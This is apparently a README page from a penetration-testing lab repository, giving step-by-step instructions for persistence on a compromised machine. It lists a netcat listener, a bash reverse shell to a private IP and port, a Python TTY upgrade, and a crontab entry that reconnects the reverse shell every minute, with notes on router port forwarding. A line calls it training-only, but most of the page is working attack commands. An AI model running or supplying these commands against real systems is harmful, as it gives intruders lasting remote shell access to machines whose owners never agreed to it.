# Persistence


Setup a way for the box to always send you a reverse shell.

Open up router and set up a port for persistant shell 
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/fecedce9-86d4-4bc3-846f-0cb2133a8743)
***Make sure Redirect target port is 22.***

listner is netcat.

(upgrade) 

```
python -c 'import pty; pty.spawn("/bin/bash")'
```


### (ATTACKER) 

```
nc -lvp 55556
```

### (VICTIM) 

```
sh -i >& /dev/tcp/192.168.122.209/55556 0>&1 
```

![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/e0694c70-c931-4ca7-96a6-6beddd645655)

(make sure to use your NAT port)


```
id 
```
(to verify connection) 

Remember when you catch you type `(id)` (if connection works now enter syntax in the crontab)
```
crontab -e  
```

(or)

```
sudo crontab -e
```
select (1) enter

In crontab do note the `(*)` you need all 5.

```
* * * * * sh -i >& /dev/tcp/192.168.122.209/55556 0>&1
```


 (enter this at the bottom of cron tab make sure you add 5 `(*)` with spaces inbetween then your syntax from your reverse shell generator)

make sure to comment `(#)` out #Your Name then put in your command.

(change your syntax with Reverse shell Gen if first one doesint work) Python3 shortest > /bin/bash > copy (refer to screen shot )
![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/e5be6801-7fd9-4e27-9a35-10f9955cc2f1)



![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/7fc7b2d9-c61f-496f-89cd-c8cfb1a51b89)

***This Example is only for training environment! you shouldn't be putting your name on anything! dont be that guy*** :see_no_evil:

(make sure to update crontab with new syntax if you changed it then redo listener)

(now when your terminal is killed or you reboot VVM just repeat the nc -lvp and your back in)
